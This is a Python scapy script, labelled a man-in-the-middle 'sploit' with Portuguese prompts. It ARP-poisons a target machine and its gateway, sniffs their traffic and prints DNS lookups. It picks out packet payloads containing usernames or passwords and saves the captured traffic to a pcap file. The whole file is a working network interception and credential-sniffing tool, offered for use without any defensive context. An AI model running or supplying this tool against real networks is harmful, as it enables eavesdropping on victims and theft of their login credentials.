
from scapy.all import *
import threading,sys,os,signal
print('##################################################################\n')
print ("\n\n MAN IN THE MIDDLE RFS ~ SPLOIT \n\n") 
print('##################################################################\n')
VIP = raw_input("[***]Ip do alvo: ") 
GW = raw_input("[***] IP do Gateway: ")
IFACE = raw_input("Nome da interface[ex eth0/ wlan0]:")
conf.iface = IFACE
conf.verb = 0


def get_mac(ip_address):
    responses,unanswered = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=ip_address),timeout=2,retry=10)
    for s,r in responses:
        return r[Ether].src
    return None


gateway_mac = get_mac(GW)

if gateway_mac is None:
 print("[XXXXX]Falha ao obter o endereco MAC...")
 sys.exit(0)
else:
 print("[*******] Gateway %s esta no ip %s "%(gateway_mac,GW)) 

target_mac = get_mac(VIP)

if(target_mac is None):
 print("[!!!!] Falha ao obter o MAC do alvo...")
 sys.exit(0)
else:
 print("[********] Alvo %s esta no ip %s "%(target_mac,VIP))

print('__________________________________________________________________\n')

def dnshandle(pkt):
 try:
     #print('~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n')
     host = 'Indefined'
     if pkt.haslayer(DNS) and pkt.getlayer(DNS).qr == 0:
          host = pkt.getlayer(DNS).qd.qname
          print("[*]"+VIP+" Host: "+host)
          send(pkt)

     if pkt.haslayer(TCP) and pkt[TCP].payload:
        mail_packet = str(pkt[TCP].payload)
        if "user" in mail_packet.lower() or "pass" in mail_packet.lower():
            print("[*********]Server %s"%pkt[IP].dst)
            print("[$$$$$$$$$] %s"%pkt[TCP].payload)


     if pkt.haslayer(Raw):
	  print('[**********]RAW HOST[%s]: \n'%host)
	  val =  str(pkt).encode('HEX')
	  decoded = str(val).decode('HEX')
	  print('[**********][+]Data Raw: \n %s \n'%decoded)
          print('~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n')  
 except:
   print('[-]Error:/n %s'%sys.exc_info()[0])
         
       
def v_poison():
     v = ARP(pdst=VIP,psrc = GW)
     while True:
             try:
                 send(v,verbose=0,inter=2,loop=1)
             except:
                 sys.exit(1) 
def gw_poison():
     gw = ARP(pdst=GW,psrc=VIP)
     while True:
             try:
                 send(gw,verbose=0,inter=1,loop=1)
             except:
                 sys.exit(1)

def restore_target(gateway_ip,gateway_mac,target_ip,target_mac):
 try:
    send(ARP(op=2, psrc=gateway_ip, pdst=target_ip,hwdst="ff:ff:ff:ff:ff:ff",hwsrc=gateway_mac),count=5)
    send(ARP(op=2, psrc=target_ip, pdst=gateway_ip,hwdst="ff:ff:ff:ff:ff:ff",hwsrc=target_mac),count=5)
    os.kill(os.getpid(), signal.SIGINT)
 except:
    sys.exit(1)



def poison_target(gateway_ip,gateway_mac,target_ip,target_mac):
    poison_target = ARP()
    poison_target.op = 2
    poison_target.psrc = gateway_ip
    poison_target.pdst = target_ip
    poison_target.hwdst= target_mac
    poison_gateway = ARP()
    poison_gateway.op = 2
    poison_gateway.psrc = target_ip
    poison_gateway.pdst = gateway_ip
    poison_gateway.hwdst= gateway_mac
    print "[*] Iniciando o  ARP poison..."
    while True:
        try:
            send(poison_target)
            send(poison_gateway)
            time.sleep(2)
        except:
            restore_target(gateway_ip,gateway_mac,target_ip,target_mac)
            print "[*] ARP poison ataque terminado"
            return 


vthread = [] 
gwthread = [] 
while True:
      vpoison = threading.Thread(target=v_poison)
      vpoison.setDaemon(True)
      vthread.append(vpoison)
      vpoison.start()      
      gwpoison = threading.Thread(target=gw_poison)
      gwpoison.setDaemon(True)
      gwthread.append(gwpoison)
      gwpoison.start()
      pkt = sniff(iface=IFACE,filter='',prn=dnshandle,store=0,count=100)
      wrpcap("arper.pcap",pkt)
      restore_target(GW,gateway_mac,VIP,target_mac)
      

      
